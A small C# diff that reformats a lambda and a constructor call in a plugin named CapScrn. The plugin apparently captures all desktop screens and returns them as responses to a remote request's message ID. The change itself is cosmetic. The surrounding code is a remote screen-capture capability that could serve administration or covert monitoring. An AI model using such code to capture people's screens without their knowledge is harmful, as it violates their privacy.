@@ -19,11 +19,14 @@ namespace Plugins.CapScrn
         {
             var api = new DesktopApi();
 
-            api.Invoke(async (screens) =>
+            api.Invoke(async screens =>
             {
                 foreach (Bitmap screen in screens)
                 {
-                    var result = new Response(screen.ToMemStream(), req.MessageId);
+                    var result = new Response(
+                        screen.ToMemStream(),
+                        req.MessageId
+                    );
 
                     await ResultHandler(result);
                 }
